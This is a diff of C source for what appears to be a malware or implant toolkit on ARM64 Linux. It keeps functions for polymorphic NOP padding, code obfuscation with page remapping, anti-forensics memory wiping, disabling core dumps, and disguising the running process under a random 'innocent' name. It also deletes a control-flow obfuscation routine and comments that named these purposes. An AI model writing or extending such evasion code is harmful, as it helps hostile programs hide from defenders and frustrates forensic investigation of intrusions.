@@ -13,7 +13,6 @@ static const uint32_t arm64_nop_variants[] = {
     0x8A1F0000,  // and x0, x0, xzr
 };
 
-// Generate polymorphic NOPs for ARM64
 void generate_polymorphic_nops_arm64(uint8_t* buffer, size_t nop_bytes, size_t max_size) {
     if (!buffer || nop_bytes > max_size || (nop_bytes % 4) != 0) return;
     
@@ -58,41 +57,6 @@ if (!code || max_len < 4 || (max_len % 4) != 0) return;
     }
 }
 
-void obfuscate_control_flow_arm64(uint8_t* code, size_t len) {
-    if (!code || len < 12) return;  
-
-    uint32_t* instructions = (uint32_t*)code;
-    size_t inst_count = len / 4;
-
-    size_t max_insertions = (inst_count > 100) ? 10 : inst_count / 10;
-    size_t insertions_made = 0;
-
-    for (size_t i = 0; i < inst_count - 3 && insertions_made < max_insertions; i++) {
-        uint32_t inst = instructions[i];
-        
-        if ((inst & 0xFF000010) == 0x54000000) {
-            
-            if (rand() % 100 < 15) {  
-                if (i + 2 < inst_count - 2) {
-                    for (size_t j = inst_count - 1; j > i; j--) {
-                        if (j + 2 < inst_count) {
-                            instructions[j + 2] = instructions[j];
-                        }
-                    }
-
-                    
-                    instructions[i] = 0xF1000000;      
-                    instructions[i + 1] = 0x54000020;  
-
-                    i += 2;  // Skip the inserted instructions
-                    insertions_made++;
-                }
-            }
-        }
-    }
-}
-
-
 void apply_arm64_obfuscation(uint8_t* code, size_t len) {
         if (!code || len < 128) return;
     
@@ -135,7 +99,6 @@ void apply_arm64_obfuscation(uint8_t* code, size_t len) {
     mprotect(page_start, page_len, PROT_READ | PROT_EXEC);
 }
 
-// Enhanced anti-forensics functions
 void secure_memory_wipe(void* ptr, size_t size) {
     if (!ptr || size == 0) return;
 
@@ -156,6 +119,7 @@ void prevent_core_dumps(void) {
     struct rlimit rl;
     rl.rlim_cur = 0;
     rl.rlim_max = 0;
+    // The below might fail, but the execution won't be impacted
     setrlimit(RLIMIT_CORE, &rl);
 }
 
@@ -165,12 +129,10 @@ void hide_process_title(int argc, char* argv[]) {
         size_t orig_len = strlen(argv[0]);
         memset(argv[0], 0, orig_len);
 
-        // Set innocent process name
         const char* innocent_name = get_random_innocent_name();
         strncpy(argv[0], innocent_name, orig_len - 1);
         argv[0][orig_len - 1] = '\0';
 
-        // Update process title via prctl
         prctl(PR_SET_NAME, innocent_name, 0, 0, 0);
     }
 }
